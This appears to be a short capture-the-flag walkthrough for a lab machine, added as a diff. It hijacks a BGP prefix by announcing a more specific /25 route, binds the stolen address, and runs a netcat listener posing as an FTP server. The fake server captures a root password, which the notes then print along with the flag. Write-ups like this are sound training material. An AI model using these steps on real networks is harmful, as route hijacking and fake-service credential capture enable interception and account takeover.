@@ -1,0 +1,35 @@
+#10.10.10.105
+--------------
+#BGP Prefix Hijack Attacks - ColoState     [Border Gateway Protocol (BGP)]
+>>>https://www.isi.deterlab.net/file.php?file=/share/shared/BGPhijacking
+
+#configure bgpd.conf file
+vtysh bgpd.conf
+configure terminal
+router bgp 100     (we used 100 because we are on AS100)  [Autonomous Systems (AS)]
+network 10.120.15.0/25      (ip found in 'Tickets' tab of the website)
+end
+quit
+#we need to narrow down the CIDR a bit because the /24 address is in the routing table by default. So change it to /25 
+
+#add ip to any interface
+ip addr add 10.120.15.10/25 dev eth1
+
+#listen on ftp server because there is an issue connecting by ftp to server
+nc -lvp 21
+#wait for connection to establish
+#press ENTER
+#type 220
+#type 331       
+#331 is the return code for password, since we act as a server, then we can ask the password by using 331 return code
+#PSSWD= BGPtelc0rout1ng
+#USER= root
+#use ssh to connect to root
+
+#key
+2832e552061532250ac2a21478fd4866
+
+#secretdata.txt         (hex decode)
+56484a766247786c5a43456849513d3d     -->  Trolled!
+
+
